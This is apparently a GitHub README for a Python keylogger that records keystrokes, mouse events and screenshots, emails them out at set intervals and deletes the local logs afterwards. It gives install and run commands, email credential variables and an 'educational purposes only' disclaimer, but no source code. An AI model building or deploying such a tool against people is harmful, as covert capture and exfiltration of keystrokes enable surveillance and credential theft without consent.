## Keylogger

This Python-based keylogger records keystrokes, mouse activity, and takes periodic screenshots. The data is logged and sent via email at regular intervals. It also supports automatic cleanup of logs and screenshots after sending the report.
Features

    Records all keystrokes, mouse clicks, movements, and scroll events.
    Takes screenshots at configurable intervals.
    Sends the log and screenshots to a specified email at regular intervals.
    Cleans up local log and screenshots after sending the report.
    Fully configurable email and timer settings.

## Prerequisites

    Python 3.x
    Internet connection for sending emails.
    Email account (preferably Gmail) for sending logs.

## Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/Avinashkumar57/keylogger.git
   ```
2. Navigate to the project directory:
   ```bash
   cd keylogger
   ```
3. Install the required libraries:
   ```bash
   pip install pynput
   ```

## Required Libraries

Make sure you have the following libraries installed before running the keylogger:

bash

pip install pynput pyscreenshot


## Configure Email Credentials:

    Open the script and set your email credentials in the following variables:

    python

    EMAIL_ADDRESS = "your_email@gmail.com"
    EMAIL_PASSWORD = "your_password"

## Set Email and Screenshot Intervals:

    You can configure how often the email reports and screenshots should be sent:

    python

    SEND_EMAIL_EVERY = 60  # Time in seconds between email reports
    SEND_SCREENSHOT_EVERY = 20  # Time in seconds between screenshots

## Usage

1. Open the terminal or command prompt.
2. Run the keylogger script:
   ```bash
   python keylogger.py
   ```
3. The keylogger will start capturing keystrokes and saving them to `log.txt`.

## Run the Keylogger:

    Start the keylogger using:

    bash

        python keylogger.py

    Stopping the Keylogger:
        To stop the keylogger, you can interrupt it manually (Ctrl+C). The script will automatically clean up any temporary files.
### Stopping the Key Logger

To stop the keylogger, simply terminate the script (e.g., using `Ctrl + C` in the terminal).

## Code Explanation
KeyLogger Class

    Initialization (__init__): Sets up email and screenshot intervals, creates necessary folders, and starts the log.
    Keyboard and Mouse Event Handlers: Tracks all keypresses and mouse events, including clicks, movements, and scrolls.
    Email Report (send_mail): Sends the collected log and screenshots as an email attachment.
    Screenshot Capture (screenshot): Periodically captures screenshots and stores them locally.
    Logging: All captured data is logged to a file (keylogger.log).

Cleanup

    Log and Screenshot Cleanup: After sending the email, the keylogger deletes the local logs and screenshots.

## Important Note

    This keylogger is for educational purposes only. Using this software for illegal activities such as unauthorized surveillance or monitoring without consent is prohibited.

**Note:** Please use this tool responsibly and ethically.

## Contact

For questions or inquiries, feel free to reach out:

- GitHub: https://github.com/Avinashkumar57
